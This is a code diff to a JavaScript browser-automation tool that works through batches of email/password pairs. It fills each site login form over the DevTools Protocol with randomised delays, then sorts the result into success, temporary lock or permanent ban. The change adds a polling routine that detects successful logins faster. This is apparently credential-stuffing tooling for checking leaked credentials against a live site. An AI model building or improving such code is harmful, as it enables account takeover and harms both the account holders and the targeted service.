@@ -31,17 +31,15 @@ const COOKIE_SELECTORS = ['.coi-banner__accept', '.coi-banner__close', 'button[o
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 const jitter = (a, b) => sleep(a + Math.random() * (b - a));
 
-function classifyOutcome({ url = '', text = '' }) {
+function classifyOutcome({ url = '', text = '', successBanner = false }) {
   const u = (url || '').toLowerCase();
   const t = (text || '').toLowerCase();
+  if (successBanner) return 'SUCCESS';
   if (u.includes('/account') || u.includes('/lobby') || u.includes('/dashboard') ||
       t.includes('logout') || t.includes('sign out') || t.includes('my account')) return 'SUCCESS';
-  if (t.includes('permanently') || t.includes('banned') || t.includes('closed') ||
-      t.includes('terminated')) return 'PERM_BAN';
-  if (t.includes('temporarily') || t.includes('locked') || t.includes('try again later') ||
-      t.includes('too many attempts')) return 'TEMP_LOCK';
-  if (t.includes('no account') || t.includes('does not exist') || t.includes('invalid email') ||
-      t.includes('invalid username') || t.includes('incorrect email') || t.includes('user not found')) return 'NO_ACCOUNT';
+  if (t.includes('temporarily disabled')) return 'TEMP_LOCK';
+  if (t.includes('has been disabled'))    return 'PERM_BAN';
+  if (t.includes('incorrect')) return 'CONTINUE';
   return 'CONTINUE';
 }
 
@@ -167,8 +165,27 @@ async function fillAndSubmit(cdp, sessionId, selectors, email, password, overwri
 }
 
 async function readState(cdp, sessionId) {
-  const expr = `({ url: location.href, text: (document.body && document.body.innerText || '').slice(0, 8000) })`;
-  return (await evaluate(cdp, sessionId, expr)) || { url: '', text: '' };
+  const expr = `({
+    url: location.href,
+    text: (document.body && document.body.innerText || '').slice(0, 8000),
+    successBanner: !!document.querySelector('.ol-alert__content--status_success'),
+  })`;
+  return (await evaluate(cdp, sessionId, expr)) || { url: '', text: '', successBanner: false };
+}
+
+// Poll the page every 200ms until a definitive outcome appears or the cap is hit.
+// First attempt gets 7s cap (site can be slow to respond); retries get 3s.
+async function waitForOutcome(cdp, sessionId, attempt) {
+  const maxWait = attempt === 1 ? 7000 : 3000;
+  const deadline = Date.now() + maxWait;
+  let last = { url: '', text: '', successBanner: false };
+  while (Date.now() < deadline) {
+    last = await readState(cdp, sessionId);
+    const o = classifyOutcome(last);
+    if (o !== 'CONTINUE') return o;
+    await sleep(200);
+  }
+  return classifyOutcome(last);
 }
 
 // ── process one credential ─────────────────────────────────────────────────
@@ -221,8 +238,7 @@ async function processCredential({ cred, batchId, apiKey, projectId, base44, pro
             await jitter(300, 600);
           }
           await fillAndSubmit(cdp, sess, cfg.selectors, cred.email, cred.password, attempt > 1);
-          await jitter(1500, 2500);
-          return classifyOutcome(await readState(cdp, sess));
+          return await waitForOutcome(cdp, sess, attempt);
         } catch { return 'ERROR'; }
       };
 
